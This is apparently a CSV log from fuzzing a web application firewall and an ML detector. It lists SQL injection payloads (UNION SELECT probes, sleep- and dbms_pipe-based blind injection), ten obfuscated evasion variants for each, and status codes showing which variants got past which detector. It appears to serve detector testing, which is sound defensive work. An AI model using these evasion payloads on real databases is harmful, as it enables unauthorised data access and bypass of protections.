Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5,Fuzzed Payload 6,Fuzzed Timestamp 6,WAF Status 6,ML Status 6,Combined Result 6,Fuzzed Payload 7,Fuzzed Timestamp 7,WAF Status 7,ML Status 7,Combined Result 7,Fuzzed Payload 8,Fuzzed Timestamp 8,WAF Status 8,ML Status 8,Combined Result 8,Fuzzed Payload 9,Fuzzed Timestamp 9,WAF Status 9,ML Status 9,Combined Result 9,Fuzzed Payload 10,Fuzzed Timestamp 10,WAF Status 10,ML Status 10,Combined Result 10
1,2024-12-17T20:34:45.496558,-1579%'   )    )     )   union all select 7272#,403,403,403,both_correct,"- oR 0%'   )    )     )   union
all SelEct/**/4036=(sElECt 4036)#",2024-12-17T20:34:48.539327,403,200,waf_correct_ml_incorrect,"- Or '''='''%'   )   
)     )   union
all SELECT 4036 like (seLEcT (SELECT 0x1))#W",2024-12-17T20:34:52.809415,403,403,both_correct,"- Or '''='''%'/**/  ) 
 
)     )   union
all SELECT '>k' NOT LIKE '>kr' lIke (sElEct (SeLECt 0x1))#W",2024-12-17T20:34:57.831346,403,403,both_correct,"- or '''='''%'   ) 
 
)     )   union
all SELECT '>k' NOT LIKE '>kr' likE (selECt	(selecT 0x1))#W@",2024-12-17T20:35:03.707766,403,403,both_correct,"- oR '''='''%'   ) 
 
)     )   union
all SELECT '>k'/*~.J^j*/NOT LIKE '>kr' like (seLECT
(sELECt 0x1))#W@",2024-12-17T20:35:09.565578,403,403,both_correct,"- oR '''='''%'   ) 


)     ) /**/ union
all SELECT '>k'/**/NOT LIKE '>kr' liKe (selEcT
(sEleCt 0x1))#W@",2024-12-17T20:35:16.029596,403,403,both_correct,"-	or '''='''%'   ) 


)     ) /**/ union
all SELECT '>k'/**/NOT LIKE/**/'>kr' lIke (seleCT
(SeLEct 0x1))#W@^~",2024-12-17T20:35:22.104437,403,403,both_correct,"- or/**/'''='''%'   ) 


)     ) /**/ union
all SELECT '>k'/**/NOT LIKE/**/'>kr' liKE (seLeCt
(SelEct 0x1))#W@^~",2024-12-17T20:35:28.399958,403,403,both_correct,"- Or/**/'''='''%' 
 ) 


)/**/    ) /**/ union
all SELECT '>k'/**/NOT LIKE/**/'>kr' lIke (SElECT
(SeLECT 0x1))#W@^~pO",2024-12-17T20:35:34.808503,403,403,both_correct,"- oR/**/'''='''%' 
 ) 


)/**/   /**/) /**/ union
all SELECT '>k'/**/NOT
LIKE/**/'>kr' lIkE (sELecT
(seLECt 0x1))#W@^~pO`",2024-12-17T20:35:41.902168,403,200,waf_correct_ml_incorrect
2,2024-12-17T20:35:48.806734,"1'  )   union all select null,null,null,null,null#",403,403,403,both_correct,"' ' not like ' [''  )/**/  union all
sELect null,null,null,null,null#aN",2024-12-17T20:35:51.285639,403,403,both_correct,"'	' not like ' [''  )   union all
SeLECT null,null,null,null,null#aNE|",2024-12-17T20:35:55.689390,403,403,both_correct,"'
' not like ' [''  )   union all
selEcT/**/null,null,null,null,null#aNE|",2024-12-17T20:36:00.157995,403,403,both_correct,"'
' not like ' [''  )  
union all
seleCt null,null,null,null,null#aNE|H",2024-12-17T20:36:04.698108,403,403,both_correct,"'
' not like ' [''  ) /**/
union all SeLECT null,null,null,null,null#aNE|H,",2024-12-17T20:36:09.518363,403,403,both_correct,"'
' not like ' [''  )  	union all SeleCT null,null,null,null,null#aNE|H,",2024-12-17T20:36:14.264058,403,403,both_correct,"' ' not like ' [''  )  	union all/**/SElEcT null,null,null,null,null#aNE|H,k?",2024-12-17T20:36:18.850272,200,403,waf_incorrect_ml_correct,"' ' not like ' [''/**/ )   union all/**/sEleCT null,null,null,null,null#aNE|H,k?_*",2024-12-17T20:36:23.568796,200,403,waf_incorrect_ml_correct,"' ' not like
' [''  )   union all/*Rf*/SElect null,null,null,null,null#aNE|H,k?_*",2024-12-17T20:36:28.709024,200,403,waf_incorrect_ml_correct,"' ' not like
' [''  )   union	all SeLeCt null,null,null,null,null#aNE|H,k?_*TI",2024-12-17T20:36:33.704036,403,403,both_correct
3,2024-12-17T20:36:38.779790,76971829y,200,200,200,both_correct,76971829y,2024-12-17T20:36:39.375679,200,200,both_correct,76971829y,2024-12-17T20:36:40.906974,200,200,both_correct,76971829y,2024-12-17T20:36:42.462027,200,200,both_correct,76971829y,2024-12-17T20:36:44.030757,200,200,both_correct,76971829y,2024-12-17T20:36:45.564090,200,200,both_correct,76971829y,2024-12-17T20:36:47.130519,200,200,both_correct,76971829y,2024-12-17T20:36:48.684012,200,200,both_correct,76971829y,2024-12-17T20:36:50.248773,200,200,both_correct,76971829y,2024-12-17T20:36:51.800621,200,200,both_correct,76971829y,2024-12-17T20:36:53.374171,200,200,both_correct
4,2024-12-17T20:36:54.956714,1.02606E+15,200,200,200,both_correct,"(SELECT (SELECT 1)).02606E+'W' like
'W'",2024-12-17T20:36:55.606957,403,403,both_incorrect,"(SeleCT/*A*/(SelEct	0xc6f NOT LIKE  AND 1)).02606E+'W' LIKe
'W'",2024-12-17T20:36:58.581569,403,403,both_incorrect,"(SeLecT/*QW[Q*/(seLECT 0xc6f NOT LIKE  && '(SELECT/**/1)%'!='(SELECT 5)%>')).02606E+'W' lIkE
'W'",2024-12-17T20:37:02.675609,403,403,both_incorrect,(seLect/**/(sElECt 0xc6f not like  && '(SELECT  AND (SELECT 'vd'<>'vd2'))%'!='(SELECT 5)%>')).02606E+'W' LiKe 'W',2024-12-17T20:37:08.352966,403,403,both_incorrect,"(seLeCt/*?v*/(select 0xc6f not like 
&& '(SELECT  AND (SELECT/**/'vd'<>'vd2'))%'<>'(SELECT  OR 7322 LIKE 0x1c9a)%>')).02606E+'W' liKE 'W'",2024-12-17T20:37:14.900794,403,403,both_incorrect,"(SEleCT/*?v*/(SElECT 0xc6f not like 
 and  '(SELECT  AND (SELECT 'vd'<>'vd2'))%'<>'(SELECT  OR (SELECT 1087<>(SELECT 1088)) LIKE
0x1c9a)%>')).02606E+'W' LikE 'W'",2024-12-17T20:37:22.599732,403,403,both_incorrect,"(sElecT (SElECt 0xc6f not like 
 aNd 	'(SELECT  AND (SELECT 'vd'<>'vd2'))%' not like '(SELECT  OR (SELECT (SELECT 1087)<>(SELECT (SELECT 'J' LIKE 'J'))) LIKE
0x1c9a)%>')).02606E+'W' lIke 'W'",2024-12-17T20:37:31.291318,403,403,both_incorrect,"(SeLEcT (SEleCt 0xc6f not like   aND 	'(SELECT  AND (SELECT 'vd'<>'vd2'))%' not like '(SELECT  OR (SELECT (SELECT (SELECT 5854= OR 0))<>(SELECT (SELECT 'J'/**/LIKE 'J'))) LIKE
0x1c9a)%>')).02606E+'W' likE 'W'",2024-12-17T20:37:41.439809,403,403,both_incorrect,"(SElEcT (SElect 0xc6f not like/**/  And  '(SELECT  AND (SELECT 'vd'<>'vd2'))%' not like '(SELECT  OR (SELECT (SELECT (SELECT 'p\c'='p\c'= OR (SELECT 0x1)))<>(SELECT (SELECT 'J'/**/LIKE 'J'))) LIKE
0x1c9a)%>')).02606E+'W' lIke 'W'",2024-12-17T20:37:52.242568,403,403,both_incorrect,"(sElECt (SELEcT 0xc6f not like/**/  anD  '(SELECT  AND (SELECT 'vd'<>'vd2'))%' not like '(SELECT  OR (SELECT (SELECT (SELECT 'p\c'='p\c'= OR (SELECT 0x1)))<>(SELECT (SELECT
'J'/**/LIKE 'J'))) LIKE
0x1c9a)%>')).02606E+(SeLecT/**/'-rTE' NOT LIKE '-rTEo')",2024-12-17T20:38:03.983184,403,403,both_incorrect
5,2024-12-17T20:38:17.268311,"1""   )    )    and sleep  (  5  )   and    (    (   ""timv""  =  ""timv",403,403,200,waf_correct_ml_incorrect," Or 0x0""   )    )    and sleep  (  'y#Wg' NOT LIKE 'y#WgM'  ) 
 and    (    (  /**/""timv""  =  ""timvh'",2024-12-17T20:38:20.523023,403,200,waf_correct_ml_incorrect," oR 0x0""   )    )    and sleep  (  'y#Wg' NOT LIKE 'y#WgM'  )   and    (    (   ""timv""  =  ""timvh'",2024-12-17T20:38:26.287224,403,200,waf_correct_ml_incorrect," or 0x0""   )    )    and sleep  (  'y#Wg' NOT LIKE 'y#WgM'  )   and /**/  (	   (   ""timv""  =  ""timvh''-SB' NOT LIKE '-SBi'",2024-12-17T20:38:32.154658,403,403,both_correct," or 0x0""   )    )/**/   and sleep  (  'y#Wg' NOT LIKE 'y#WgM'  )   and /**/  (    (   ""timv""  =  ""timvh''-SB' NOT LIKE '-SBi'[",2024-12-17T20:38:39.036852,403,403,both_correct," Or 0x0"" 
 )    )/**/   and sleep  (  'y#Wg' NOT LIKE 'y#WgM' /**/)   and /**/  (    (   ""timv""  =  ""timvh''-SB' NOT LIKE '-SBi'[m'",2024-12-17T20:38:46.021533,403,200,waf_correct_ml_incorrect," oR 0x0"" 
 )    )/**/   and sleep  (  'y#Wg' NOT LIKE 'y#WgM' /**/)   and 
  (    (   ""timv""  =  ""timvh''-SB' NOT LIKE '-SBi'[m'",2024-12-17T20:38:53.306199,403,200,waf_correct_ml_incorrect," or 0x0"" 	 )    )    and sleep  (  'y#Wg' NOT LIKE 'y#WgM' /*	]*/)   and 
  (    (   ""timv""  =  ""timvh''-SB' NOT LIKE '-SBi'[m'",2024-12-17T20:39:00.636766,403,200,waf_correct_ml_incorrect," oR 0x0""   )    )   /**/and sleep  (  'y#Wg' NOT LIKE 'y#WgM' /*SR\(*/)   and 
  (    (   ""timv""  =  ""timvh''-SB' NOT LIKE '-SBi'[m'",2024-12-17T20:39:07.692229,403,200,waf_correct_ml_incorrect," || 0x0""   )    )
  /**/and sleep  (  'y#Wg'/**/NOT LIKE 'y#WgM' /*SR\(*/)   and 
  (    (   ""timv""  =  ""timvh''-SB' NOT LIKE '-SBi'[m'",2024-12-17T20:39:14.913978,403,200,waf_correct_ml_incorrect,"  OR  0x0""   )    )
  /**/and sleep  (  'y#Wg'/**/NOT LIKE 'y#WgM' /*SR\(*/)   and   /**/(    (   ""timv""  =  ""timvh''-SB' NOT LIKE '-SBi'[m'GZ",2024-12-17T20:39:22.328467,403,200,waf_correct_ml_incorrect
6,2024-12-17T20:39:30.272871,stacey@mediacar.la,200,200,200,both_correct,stacey@mediacar.la,2024-12-17T20:39:31.273044,200,200,both_correct,stacey@mediacar.la,2024-12-17T20:39:33.226910,200,200,both_correct,stacey@mediacar.la,2024-12-17T20:39:35.183617,200,200,both_correct,stacey@mediacar.la,2024-12-17T20:39:37.158058,200,200,both_correct,stacey@mediacar.la,2024-12-17T20:39:39.133489,200,200,both_correct,stacey@mediacar.la,2024-12-17T20:39:41.111904,200,200,both_correct,stacey@mediacar.la,2024-12-17T20:39:43.107659,200,200,both_correct,stacey@mediacar.la,2024-12-17T20:39:45.078279,200,200,both_correct,stacey@mediacar.la,2024-12-17T20:39:47.086620,200,200,both_correct,stacey@mediacar.la,2024-12-17T20:39:49.057538,200,200,both_correct
7,2024-12-17T20:39:51.018508,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  ""jzmg""  =  ""jzmg",403,403,403,both_correct,"SeLect count  (  *  )   FROm generate_series  (  (SELEct 1),(seLEcT 2003)<>2004  )   AnD   (  ""jzmg"" 	/**/LIKE   ""jzmg",2024-12-17T20:39:55.313883,403,200,waf_correct_ml_incorrect,"select count  (  *  )   FroM generate_series /**/( 	(SeLEcT  OR 0),(seLECt 'e' LIKE 'e')<>0x7d4  )   and   (  ""jzmg"" 	/*zY
L*/LiKE   ""jzmg",2024-12-17T20:40:02.141447,403,403,both_correct,"SEleCT count  (  *  )   FROm generate_series /**/(  (SeLECT/**/ oR ' AND 1' not like '(SELECT 39)'),(select 'e' LIkE 'e')<>0x7d4  )   ANd   (  ""jzmg"" 	/*\4	#n*/LiKe   ""jzmg",2024-12-17T20:40:09.667269,403,403,both_correct,"sELeCt count  (  *  )   FRoM generate_series /**/(  (selecT/**/ Or ' AND 0x1' not like '(SELECT (SELECT 6054!=6055))'),(sEleCt 'e' likE 'e')!=0x7d4  )   ANd   (  ""jzmg""/**/	/*h*/likE   ""jzmg",2024-12-17T20:40:18.788532,403,403,both_correct,"SeleCT count  (  *  )   FroM generate_series /**/(  (SeLEct/*+q( */ oR ' AND 0x1' not
like '(SELECT (SELECT (SELECT '8]'<>'(SELECT 8)]o')!=6055))'),(SELEcT 'e' LIke 'e') not like 0x7d4  )   aND   (  ""jzmg"" 	/**/liKe   ""jzmg",2024-12-17T20:40:29.103307,403,403,both_correct,"sELeCt count  (  *  )   FRom generate_series  (  (seleCt/*+q( */ or ' AND 0x1' not
like '(SELECT (SELECT (SELECT ' && 1]'<>'(SeLecT (SELECT 'zG'!='zG3'))]o')!=6055))'),(sElEct 'e' LIke 'e') not like 0x7d4  ) 	 ANd   (  ""jzmg"" 	/**/lIkE   ""jzmg",2024-12-17T20:40:40.635992,403,403,both_correct,"SeLEcT count  (  *  )   from generate_series  (  (sELecT/*+q( */ oR ' AND 0x1' not
like '(SELECT (SELECT (SELECT ' &&  aND (sELecT 1)]'<>'(SelEcT (seLECt/**/'zG'!='zG3'))]o')!='0'<>'0J'))'),(SELEct 'e' LiKE 'e') not like 0x7d4  ) 	 anD   (  ""jzmg""  /**/like   ""jzmg",2024-12-17T20:40:53.312892,403,403,both_correct,"SelECT/**/count  (  *  )   fRoM generate_series  (  (SeLEcT/*+q( */ Or ' AND 0x1' not like '(SELECT (SELECT (SELECT ' &&  aND (SeLECt '""' LiKe '""')]'<>'(SeLECt (seLEct/**/'zG' not like 'zG3'))]o')!=' AnD (sElEcT 1)'<>'0J'))'),(sELEcT 'e' LiKE 'e') not like 0x7d4  ) 	 AND   (  ""jzmg""  /**/Like   ""jzmg",2024-12-17T20:41:06.715437,403,403,both_correct,"SeLEct count  (  *  )   frOm generate_series  (  (seLEcT/*+q( */ Or ' AND 0x1' not like '(SELECT (SELECT (SELECT '  and   anD (sELECt '""' lIkE '""')]'<>'(sELECT (sELECt/**/'zG' not like 'zG3'))]o')!=' ANd (SELECT  aND (seLECT 3336 NOT LIKE 3337))'<>'0J'))'),(SelECt 'e' LIKe 'e') not like 0x7d4  ) 
 aNd   (  ""jzmg""  /**/LiKE   ""jzmg",2024-12-17T20:41:22.079585,403,403,both_correct,"SeLECt count  (  *  )   frOm generate_series  (  (sElecT/*+q( */ oR ' AND 0x1' not like '(SELECT (SELECT (SELECT '  anD   AND (selECt '""' LIke '""')]'<>'(sELect (sEleCT/*x?MP*/'zG' not like 'zG3'))]o')!=' AND (SeLEcT  aND (SeLeCt/**/(seLeCT 0x1) NOT LIKE 47 IN (46,47,48)))'<>'0J'))'),(SelEct 'e' liKe 'e') not like 0x7d4  ) 	 &&   (  ""jzmg""  /**/LIKe   ""jzmg",2024-12-17T20:41:38.701237,403,403,both_correct
8,2024-12-17T20:41:56.728496,le8ru41,200,200,200,both_correct,le8ru41,2024-12-17T20:41:57.179190,200,200,both_correct,le8ru41,2024-12-17T20:41:58.633214,200,200,both_correct,le8ru41,2024-12-17T20:42:00.098081,200,200,both_correct,le8ru41,2024-12-17T20:42:01.548775,200,200,both_correct,le8ru41,2024-12-17T20:42:03.012713,200,200,both_correct,le8ru41,2024-12-17T20:42:04.460638,200,200,both_correct,le8ru41,2024-12-17T20:42:05.913989,200,200,both_correct,le8ru41,2024-12-17T20:42:07.366506,200,200,both_correct,le8ru41,2024-12-17T20:42:08.818017,200,200,both_correct,le8ru41,2024-12-17T20:42:10.261310,200,200,both_correct
9,2024-12-17T20:42:11.708700,50422961s,200,200,403,waf_correct_ml_incorrect,50422961s,2024-12-17T20:42:12.272843,200,403,waf_correct_ml_incorrect,50422961s,2024-12-17T20:42:13.825555,200,403,waf_correct_ml_incorrect,50422961s,2024-12-17T20:42:15.366352,200,403,waf_correct_ml_incorrect,50422961s,2024-12-17T20:42:16.935146,200,403,waf_correct_ml_incorrect,50422961s,2024-12-17T20:42:18.484637,200,403,waf_correct_ml_incorrect,50422961s,2024-12-17T20:42:20.196593,200,403,waf_correct_ml_incorrect,50422961s,2024-12-17T20:42:21.788982,200,403,waf_correct_ml_incorrect,50422961s,2024-12-17T20:42:23.375889,200,403,waf_correct_ml_incorrect,50422961s,2024-12-17T20:42:24.965523,200,403,waf_correct_ml_incorrect,50422961s,2024-12-17T20:42:26.530322,200,403,waf_correct_ml_incorrect
10,2024-12-17T20:42:28.105573,"1'+  (  select 'ovti' where 4243  =  4243 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   +'",403,403,200,waf_correct_ml_incorrect,"1'+  (  select 'ovti' where 4243  =	 4243 and 6537  =  dbms_pipe.receive_message  (  chr  (  '$' NOT LIKE '$d'  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (   AND 1  )  ,(SELECT 5)   )    )  /**/+'",2024-12-17T20:42:35.929539,403,200,waf_correct_ml_incorrect,"1'+  (  select 'ovti' where 4243  =  4243 and 6537  =  dbms_pipe.receive_message  (  chr  (  '$' NOT LIKE '$d'  )  ||chr  (  (SELECT 1)  )  ||chr  (  117  )  ||chr  (   AND 0x1a3d<>6718  )  ,(SELECT 5)   )    )   +'",2024-12-17T20:42:46.264289,403,403,both_correct,"1'+  (  select 'ovti' where 4243  =  4243 and 3938 IN ((SELECT 3937),3938,3939)  =  dbms_pipe.receive_message  (  chr  (  '$' NOT
LIKE '$d'  )  ||chr  (  (SELECT  AND 1)  )  ||chr  (  117  )  ||chr  (   AND 0x1a3d<>6718  )  ,(SELECT 5)   )    )/**/  +'",2024-12-17T20:42:57.635654,403,403,both_correct,"1'+  (  select 'ovti'/**/where 4243  =  0x1093 and ';W'=';W' IN ((SELECT 3937),3938,3939)  =  dbms_pipe.receive_message  (  chr  (  '$' NOT LIKE '$d'  )  ||chr  (  (SELECT  AND  OR 0)  )  ||chr  (  117  )  ||chr  (   AND 0x1a3d<>6718  )  ,(SELECT 5)   )    )/*)*0*/  +'",2024-12-17T20:43:10.651016,403,403,both_correct,"1'+  (  select 'ovti'/*GQ""""7*/where 4243  =  0x1093 and ';W'=';W' IN ((SELECT 3937),3938,3939)  =  dbms_pipe.receive_message  (  chr  (  '$' NOT	LIKE '$d'  )  ||chr  (/**/ (SELECT  AND  OR 0)  )  ||chr  (  117  )  ||chr  (   AND 0x1a3d<>6718  )  ,(SELECT (SELECT (SELECT 1)))   )    )/*)*'.'!='.5'*/  +'",2024-12-17T20:43:24.613432,403,403,both_correct,"1'+  (  select 'ovti'/**/where 4243  =  0x1093 and ';W'=';W' IN ((SELECT 3937),'	'<>'	i',3939)  =  dbms_pipe.receive_message  (  chr  (  '$' NOT	LIKE '$d'  )  ||chr  (  (SELECT  AND  OR 0)  )  ||chr  (   AND 1  )  ||chr  (   AND 0x1a3d<>6718  )  ,(SELECT
(SELECT (SELECT 0x1)))   )    )/*)*'.'!='.5'*/  +'",2024-12-17T20:43:40.127406,403,403,both_correct,"0x1'+  (  select 'ovti' where 4243  =  0x1093 and ';W'=';W' IN ((SELECT 3937),'	'<>'	i',3939)  =  dbms_pipe.receive_message  (  chr  (  '$' NOT	LIKE '$d'  )  ||chr  (  (SELECT  AND  OR  OR '/=' LIKE '/=')  )  ||chr  (   AND 1  )  ||chr  (   AND 0x1a3d<>6718  )  ,(SELECT	(SELECT (SELECT 0x1)))   )    )/*)*'.'!='.5'*/  +'",2024-12-17T20:43:55.577541,403,403,both_correct,"0x1'+  (  select 'ovti' where 0x1093  =  0x1093 and ';W'=';W' IN ((SELECT 3937),'	'<>'	i', OR 0)  =  dbms_pipe.receive_message  ( /*98E/@*/chr  ( 
'$' NOT	LIKE '$d'  )  ||chr  (  (SELECT  AND  OR  OR '/ lIke ' LIKE '/=')  )  ||chr  (   AND 1  )  ||chr  (   AND 0x1a3d<>'d' LIKE 'd'  )  ,(SELECT	(SELECT (SELECT 0x1)))   )    )/*)*'.'!='.5'*/  +'",2024-12-17T20:44:11.899577,403,403,both_correct,"0x1'+  (  select 'ovti' where 0x1093  =  0x1093 and ';W'=';W' IN ((SELECT  AND 1),'	'<>'	i', OR 0)  =  dbms_pipe.receive_message  ( /*98E/@*/chr  ( 	'$' NOT	LIKE '$d'  )  ||chr  (  (SELECT  AND  OR  OR '/ LikE ' LIKE '/ LiKe ')  )  ||chr  (/**/  AND 'Nf' NOT LIKE 'NfA'  )  ||chr  (   AND 0x1a3d<>'d' LIKE 'd'  )  ,(SELECT	(SELECT (SELECT 0x1)))   )    )/*)*'.'!='.0x5'*/  +'",2024-12-17T20:44:29.138529,403,403,both_correct,"0x1'+  (  select 'ovti' where 0x1093  =  0x1093 and ';W'=';W'	IN/*:!.*/((SELECT  AND 0x222a<> AND 1),'	'<>'	i', OR 0)  =  dbms_pipe.receive_message  ( /*98E/@*/chr  ( 	'$' NOT	LIKE '$d'  )  ||chr  (  (SELECT  AND  OR  OR '/ LIke ' LIKE '/ LIKe ')  )  ||chr  (/**/  AND 'Nf' NOT LIKE 'NfA'  )  ||chr  (   AND 0x1a3d<>'d' LIKE 'd'  )  ,(SELECT	(SELECT (SELECT 0x1)))   )    )/*)*'.'!='.0x5'*/  +'",2024-12-17T20:44:47.712800,403,403,both_correct
